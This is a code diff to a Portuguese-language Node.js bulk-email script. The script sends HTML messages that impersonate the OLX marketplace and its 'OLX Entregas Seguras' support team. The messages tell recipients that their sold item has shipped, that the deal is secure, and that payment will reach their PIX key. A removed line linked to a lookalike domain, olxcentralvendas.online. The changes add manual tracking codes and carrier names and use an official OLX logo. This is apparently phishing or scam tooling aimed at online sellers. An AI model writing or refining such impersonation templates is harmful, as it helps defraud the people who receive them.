@@ -54,11 +54,15 @@ function carregarDadosVendas() {
  * Função para enviar e-mails em massa para uma lista de destinatários
  * @param {Array} listaEmails - lista de e-mails destinatários
  * @param {string} codigoProduto - (opcional) código específico do produto
+ * @param {string} rastreioManual - (opcional) código de rastreio digitado manualmente
+ * @param {string} nomeTransportadora - (opcional) nome da transportadora digitado manualmente
  * @param {string} assuntoPersonalizado - (opcional) assunto personalizado do e-mail
  */
 async function enviarEmMassa(
   listaEmails,
   codigoProduto = null,
+  rastreioManual = null,
+  nomeTransportadora = null,
   assuntoPersonalizado = null
 ) {
   const dadosVendas = carregarDadosVendas();
@@ -70,7 +74,7 @@ async function enviarEmMassa(
     return;
   }
 
-  // Seleciona o produto (pode incluir campo rastreio no JSON)
+  // Seleciona o produto
   const produto = codigoProduto
     ? dadosVendas.find((p) => p.codigo === codigoProduto)
     : dadosVendas[0];
@@ -80,15 +84,11 @@ async function enviarEmMassa(
     return;
   }
 
-  const {
-    codigo: codigoVenda,
-    produto: nomeProduto,
-    valor: valorProduto,
-    comprador: nomeComprador,
-    rastreio = "OY240506572BR", // valor default se não vier no JSON
-  } = produto;
+  const { codigo: codigoVenda, produto: nomeProduto, comprador: nomeComprador } = produto;
 
-  const linkProduto = `https://olxcentralvendas.online/pag/?id=${codigoVenda}`;
+  // Use rastreio e transportadora manual se fornecidos, caso contrário use valores do JSON ou padrão
+  const rastreio = rastreioManual || produto.rastreio || "";
+  const transportadora = nomeTransportadora || produto.transportadora || "";
 
   let enviados = 0;
   let falhas = 0;
@@ -103,15 +103,15 @@ async function enviarEmMassa(
   console.log(`Produto: ${nomeProduto} (${codigoVenda}) | Rastreio: ${rastreio}`);
 
   for (const email of listaEmails) {
-    // Template HTML com logo, segurança e sigilo
     const mensagemHTML = `
       <div style="font-family: Arial, sans-serif; max-width: 600px; margin: auto; padding: 20px; border: 1px solid #ddd; border-radius: 10px; background-color: #f9f9f9;">
         <div style="text-align: center; margin-bottom: 20px;">
-          <img src="https://upload.wikimedia.org/wikipedia/commons/e/ec/Logo_OLX_-_OK.png" alt="OLX Logo" style="height: 50px;">
+          <img src="https://static.olx.com.br/external/base/img/olx-logo.png" alt="OLX Logo" style="height: 50px;">
         </div>
         <h2 style="color: #333;">📦 Produto Enviado – Aguardando Entrega</h2>
         <p>Olá,</p>
-        <p>Informamos que o envio do produto foi realizado com sucesso via <strong>SEDEX</strong>, utilizando o código de rastreio: <strong>${rastreio}</strong>.</p>
+        <p>Informamos que o envio do produto foi realizado com sucesso via <strong>${transportadora}</strong>` +
+      (rastreio ? `, utilizando o código de rastreio: <strong>${rastreio}</strong>.` : `.`) + `</p>
         <p>No momento, o rastreamento indica que o item <strong>ainda não saiu da transportadora</strong>. Mas não se preocupe — todo o processo está sendo monitorado pela nossa plataforma.</p>
         <hr style="border: none; border-top: 1px solid #ccc;" />
         <p><strong>🛡️ Compra 100% Segura</strong><br>
@@ -120,7 +120,7 @@ async function enviarEmMassa(
           Todos os dados envolvidos na transação são tratados com sigilo e segurança. Nem o comprador, nem o vendedor têm acesso a dados sensíveis um do outro. Utilizamos criptografia e monitoramento contínuo para evitar fraudes ou interferências externas.</p>
         <p>O valor da venda será depositado diretamente na sua <strong>chave PIX cadastrada</strong> assim que a entrega for concluída.</p>
         <div style="text-align: center; margin: 30px 0;">
-          <a href="https://rastreamento.correios.com.br/" target="_blank" style="background-color: #4CAF50; color: white; padding: 12px 20px; text-decoration: none; border-radius: 5px; display: inline-block;">📍 Acompanhar Rastreio</a>
+          ${rastreio ? `<a href="https://rastreamento.correios.com.br/" target="_blank" style="background-color: #4CAF50; color: white; padding: 12px 20px; text-decoration: none; border-radius: 5px; display: inline-block;">📍 Acompanhar Rastreio</a>` : ``}
         </div>
         <p>Seguimos acompanhando o processo de entrega para garantir que tudo ocorra com transparência, proteção e eficiência. Caso haja qualquer intercorrência, nossa equipe de suporte está à disposição para te ajudar.</p>
         <p style="color: #555; font-size: 14px;">Atenciosamente,<br><strong>Equipe de Suporte</strong><br>OLX Entregas Seguras</p>
